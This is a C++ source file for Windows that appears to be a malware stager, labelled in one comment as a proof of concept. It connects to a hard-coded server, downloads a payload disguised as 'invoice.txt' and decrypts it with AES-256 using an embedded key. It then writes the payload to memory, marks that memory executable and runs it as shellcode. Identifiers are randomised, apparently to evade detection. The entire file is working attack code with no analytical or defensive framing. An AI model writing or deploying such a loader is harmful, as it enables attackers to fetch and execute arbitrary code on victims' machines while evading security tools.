#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#include <psapi.h>

// Define the shellcode function signature
typedef void (*zhCAcpCedgP)();

bool kGOSfrjfhwzM(const char* TEInSsEqj, int yzdLOvSDmh, const char* Random4, char*& lfgRp, size_t& kIVqYdu) {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        printf("Failed to initialize Winsock.\n");
        return false;
    }

    SOCKET clientSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (clientSocket == INVALID_SOCKET) {
        perror("Error creating socket");
        WSACleanup();
        return false;
    }

    sockaddr_in serverAddress{};
    serverAddress.sin_family = AF_INET;
    serverAddress.sin_port = htons(yzdLOvSDmh);
    serverAddress.sin_addr.s_addr = inet_addr(TEInSsEqj);

    if (serverAddress.sin_addr.s_addr == INADDR_NONE) {
        perror("Invalid address/Address not supported");
        closesocket(clientSocket);
        WSACleanup();
        return false;
    }

    if (connect(clientSocket, (struct sockaddr*)&serverAddress, sizeof(serverAddress)) < 0) {
        perror("Connection failed");
        closesocket(clientSocket);
        WSACleanup();
        return false;
    }

    // Send the length of the file path first
    size_t Random4Len = strlen(Random4);
    printf("Sending file path length: %zu\n", Random4Len);
    send(clientSocket, reinterpret_cast<char*>(&Random4Len), sizeof(Random4Len), 0);

    // Send the file path to the server
    printf("Sending file path: %s\n", Random4);
    send(clientSocket, Random4, Random4Len, 0);

    int fileSize;
int bytesRead = recv(clientSocket, reinterpret_cast<char*>(&fileSize), sizeof(fileSize), 0);
if (bytesRead != sizeof(fileSize)) {
    printf("Error receiving file size: %d\n", WSAGetLastError());
    closesocket(clientSocket);
    WSACleanup();
    return false;
}

fileSize = ntohl(fileSize); // Convert from network byte order to host byte order

printf("Received file size: %d\n", fileSize);
    // Receive and save the binary data in a dynamically allocated buffer
    lfgRp = new char[fileSize];
    if (lfgRp == nullptr) {
        printf("Error allocating memory for binary data.\n");
        closesocket(clientSocket);
        WSACleanup();
        return false;
    }

    size_t totalSize = 0;
    while (totalSize < fileSize) {
        bytesRead = recv(clientSocket, lfgRp + totalSize, fileSize - totalSize, 0);
        if (bytesRead <= 0) {
            printf("Error receiving binary data: %d\n", WSAGetLastError());
            delete[] lfgRp;
            closesocket(clientSocket);
            WSACleanup();
            return false;
        }
        totalSize += bytesRead;
    }

    // Close the socket
    closesocket(clientSocket);

    kIVqYdu = totalSize;
    printf("Received data size: %zu\n", kIVqYdu);

    return true;
}

int bVfdOlkjkxVS(char * DrKmsFdBXfMxR, unsigned int DrKmsFdBXfMxR_len, char * DLhQUbzLsS, size_t DLhQUbzLsSlen) {
        HCRYPTPROV hProv;
        HCRYPTHASH hHash;
        HCRYPTKEY hKey;

        if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
                return -1;
        }
        if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
                return -1;
        }
        if (!CryptHashData(hHash, (BYTE*)DLhQUbzLsS, (DWORD)DLhQUbzLsSlen, 0)){
                return -1;              
        }
        if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
                return -1;
        }
        
        if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, DrKmsFdBXfMxR, &DrKmsFdBXfMxR_len)){
                return -1;
        }
        
        CryptReleaseContext(hProv, 0);
        CryptDestroyHash(hHash);
        CryptDestroyKey(hKey);
        
        return 0;
}



char DLhQUbzLsS []=  { 0xf1, 0x9c, 0xad, 0x3a, 0x41, 0x79, 0xfb, 0x9f, 0xb, 0xb5, 0x3, 0xd7, 0x18, 0x82, 0xdd, 0x64 };

int main() {
    const char* TEInSsEqj = "192.168.1.12";  // Replace with the actual server IP
    int yzdLOvSDmh = 8080;               // Replace with the actual server port
    const char* Random4 = "invoice.txt";  // Replace with the actual file path on the server

    char* lfgRp;
    size_t kIVqYdu;

    if (kGOSfrjfhwzM(TEInSsEqj, yzdLOvSDmh, Random4, lfgRp, kIVqYdu)) {
        printf("Binary data received successfully.\n");

        // Print received data size for debugging
        printf("Received data size: %zu\n", kIVqYdu);
        
        bVfdOlkjkxVS((char *) lfgRp, kIVqYdu, DLhQUbzLsS, sizeof(DLhQUbzLsS));

        // Allocate executable memory with READ, WRITE permissions
        LPVOID executableMemory = VirtualAlloc(NULL, kIVqYdu, MEM_COMMIT, PAGE_READWRITE);
        if (executableMemory == NULL) {
            DWORD error = GetLastError();
            printf("Error allocating executable memory: %d\n", error);
            delete[] lfgRp;
            return 1;
        }

        // Copy binary data to the executable memory
        memcpy(executableMemory, lfgRp, kIVqYdu);
        
        // Change the protection to PAGE_EXECUTE_READ
        DWORD oldProtect;
        if (!VirtualProtect(executableMemory, kIVqYdu, PAGE_EXECUTE_READ, &oldProtect)) {
            DWORD error = GetLastError();
            printf("Error changing memory protection: %d\n", error);
            VirtualFree(executableMemory, 0, MEM_RELEASE);
            delete[] lfgRp;
            return 1;
        }

        // Create a function pointer to the shellcode
        zhCAcpCedgP lbagLzOZD = reinterpret_cast<zhCAcpCedgP>(executableMemory);

        // Call the shellcode function
        printf("Executing shellcode...\n");
        lbagLzOZD();

        // No freeing of allocated memory in this POC

        printf("Shellcode executed successfully.\n");
    } else {
        printf("Failed to receive binary data.\n");
        return 1;
    }

    return 0;
}

